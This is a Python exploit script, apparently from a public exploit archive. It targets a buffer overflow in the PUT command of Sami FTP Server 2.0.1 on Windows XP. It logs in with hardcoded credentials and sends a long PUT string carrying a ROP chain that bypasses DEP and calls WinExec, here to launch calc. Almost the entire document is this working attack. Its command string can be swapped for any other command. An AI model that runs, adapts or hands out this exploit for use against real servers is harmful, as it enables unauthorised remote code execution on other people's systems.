#!/usr/bin/python
# Exploit Title: Sami FTP Server 2.0.1 PUT Command Buffer overflow (DEP Bypass)
# Date: 17 Mar 2013
# Exploit Author: ne0z
# Vendor Homepage: http://www.hatsecure.com
# Version: Sami FTP Server 2.0.1
# Tested on: Windows XP Professional SP3
# 
# Description :
# A buffer overflow is triggered when a long PUT command is sent to the
# server and the user views the Log tab. 
#
# Reference from : superkojiman

import socket, struct, sys

def little_endian(address):
  return struct.pack("<L",address)


if (len(sys.argv)<=1):
  print "Usage :"
  print "root@bt~: python samiftp.py [target] [port]"
  sys.exit(0)

target  = sys.argv[1]
port    = sys.argv[2]


fuzz   = "\x41" * 216
eip  =  little_endian(0x7c9c1652)
rop  =  "AAAABBBBCCCCDDDD"   #padding
rop   += little_endian(0x7E41E9F6) #POP EDI RETN
rop  += little_endian(0x7E411069) #retn
rop   += little_endian(0x7E414238) #POP ESI #RETN (user32.dll)
rop   += little_endian(0x7c862509) #POP to ESI
for x in range(4):
  rop += little_endian(0x7C9CDA03) #inc esi #retn (0x7c862509 + 4) = 0x7C86250D (WinExec)
rop   += little_endian(0x7E4185BB) #POP EBP RETN
rop   += little_endian(0x7c81cb12) #Next address ExitProcess()
for x in range(3):
  rop += little_endian(0x7C81106F)
rop   += little_endian(0x7e423ad9) #pushad retn


cmd  = "calc  " #

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((str(target),int(port)))
s.recv(1024)
print "[X] Logged in"
s.send("USER hatsecure\r\n")
s.recv(1024)
s.send("PASS hatsecure\r\n")
s.recv(1024)
s.send("SYST\r\n")
system = s.recv(1024)
print "[X] Detected "+system
print "[X] Sending payload"
s.send("PUT "+fuzz+eip+rop+cmd+"\r\n")
s.recv(1024)

s.close()
